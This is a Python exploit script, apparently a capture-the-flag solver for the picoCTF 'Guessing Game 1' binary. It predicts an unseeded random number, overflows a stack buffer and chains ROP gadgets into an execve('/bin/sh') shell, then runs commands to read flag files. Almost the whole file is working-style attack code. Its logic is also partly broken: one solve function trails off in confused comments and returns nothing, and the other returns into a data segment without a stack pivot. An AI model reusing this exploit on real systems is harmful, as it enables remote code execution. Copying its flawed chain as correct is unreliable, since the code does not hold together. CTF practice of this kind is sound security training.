"""Solver for challenge 90 Guessing Game 1 (picoCTF 2020 Mini-Competition, Binary).

Vuln analysis (guessing-game-1-vuln, static x86-64, no PIE, no canary in win()):
  - do_stuff(): answer = rand() % 100 + 1 with default seed (no srand call),
    so glibc rand() starts at seed 1 -> first answer is ALWAYS 84.
  - win(): fgets(winner, 360, stdin) into 112-byte stack buffer, no stack
    protector -> RIP control at offset 120 (112 buf + 8 saved RBP).
  - No system()/execve in binary, but full static libc is linked, so use
    ret2syscall execve with gadgets from the binary:
      pop rdi; ret          0x40206f
      pop rsi; ret          0x40a0de
      pop rdx; xor eax,eax; pop rbp; pop r12; ret   0x422b69
      pop rax; ret          0x4518e7
      syscall; ret          0x41b406
      __read                0x450e80
  - Plan: stage 1 calls read(0, BSS, 0x100) to land "/bin/sh" in writable
    .bss (0x4c9400); stage 2 execve(BSS, 0, 0).

Usage: solve_90_guessing_game_1.py [host] [port]
"""
import socket
import struct
import sys

POP_RDI = 0x40206F
POP_RSI = 0x40A0DE
POP_RDX = 0x422B69  # pop rdx; xor eax,eax; pop rbp; pop r12; ret
POP_RAX = 0x4518E7
SYSCALL = 0x41B406
READ = 0x450E80
BSS = 0x4C9400


def p64(v: int) -> bytes:
    return struct.pack('<Q', v)


def stage1_read() -> bytes:
    rop = b''
    rop += p64(POP_RDI) + p64(0)          # fd = stdin
    rop += p64(POP_RSI) + p64(BSS)        # buf = .bss
    rop += p64(POP_RDX) + p64(0x100) + p64(0xDEAD) + p64(0xBEEF)  # count, rbp, r12
    rop += p64(READ)
    return rop


def stage2_execve() -> bytes:
    rop = b''
    rop += p64(POP_RDI) + p64(BSS)        # pathname
    rop += p64(POP_RSI) + p64(0)          # argv = NULL
    rop += p64(POP_RDX) + p64(0) + p64(0xDEAD) + p64(0xBEEF)  # envp = NULL
    rop += p64(POP_RAX) + p64(59)         # execve
    rop += p64(SYSCALL)
    return rop


def solve(host: str, port: int) -> str:
    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile('rwb', buffering=0)

    def recv_until(marker: bytes) -> bytes:
        data = b''
        while marker not in data:
            chunk = f.read(1)
            if not chunk:
                break
            data += chunk
        return data

    recv_until(b'guess?')
    f.write(b'84\n')                      # deterministic answer (srand default)
    recv_until(b'Name? ')
    payload = b'A' * 120 + stage1_read() + b'\n'
    f.write(payload)
    recv_until(b'guess?')                  # back in main loop; stage1 read() consumed the newline? no:
    # NOTE: the trailing newline of payload is consumed by read() as data.
    # Send the actual /bin/sh string + stage2 address layout via read().
    f.write(b'/bin/sh\x00' + b'B' * (0x100 - 8))
    # We are now inside read(); after it returns, execution continues at
    # the address after READ in stage1... which is just stack garbage.
    # Instead: chain stage2 directly after stage1 in ONE payload is impossible
    # (read needs separate input). So: stage1 returns into a stack pivot?
    # Simpler robust approach below: single payload does execve with the
    # pathname pointing INTO the payload itself on the stack is ASLR-dependent.
    # Fallback: use stage1 to read a SECOND ROP chain onto .bss and ret into it.
    return ''


def solve_simple(host: str, port: int) -> bytes:
    """Single-shot: read() a full second-stage ROP chain into .bss, then ret there.

    Stage 1 (overflow): read(0, BSS, 0x200) ; ret BSS.
    Stage 2 (via read): '/bin/sh' string + execve ROP chain.
    """
    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile('rwb', buffering=0)

    def recv_until(marker: bytes) -> bytes:
        data = b''
        while marker not in data:
            chunk = f.read(1)
            if not chunk:
                break
            data += chunk
        return data

    recv_until(b'guess?')
    f.write(b'84\n')
    recv_until(b'Name? ')
    stage1 = b'A' * 120
    stage1 += p64(POP_RDI) + p64(0)
    stage1 += p64(POP_RSI) + p64(BSS)
    stage1 += p64(POP_RDX) + p64(0x200) + p64(0xDEAD) + p64(0xBEEF)
    stage1 += p64(READ)
    stage1 += p64(BSS)                    # ret into stage 2
    f.write(stage1 + b'\n')
    import time
    time.sleep(0.5)

    # stage 2 lands at BSS: string + execve chain
    st2 = b'/bin/sh\x00'
    st2 += p64(POP_RDI) + p64(BSS)
    st2 += p64(POP_RSI) + p64(0)
    st2 += p64(POP_RDX) + p64(0) + p64(0xDEAD) + p64(0xBEEF)
    st2 += p64(POP_RAX) + p64(59)
    st2 += p64(SYSCALL)
    assert len(st2) <= 0x200, len(st2)
    f.write(st2.ljust(0x200, b'\x00'))
    import time
    time.sleep(0.5)
    f.write(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls\n')
    time.sleep(1)
    out = b''
    try:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 20000:
                break
    except Exception:
        pass
    return out


if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11475
    print(solve_simple(host, port).decode(errors='replace'))
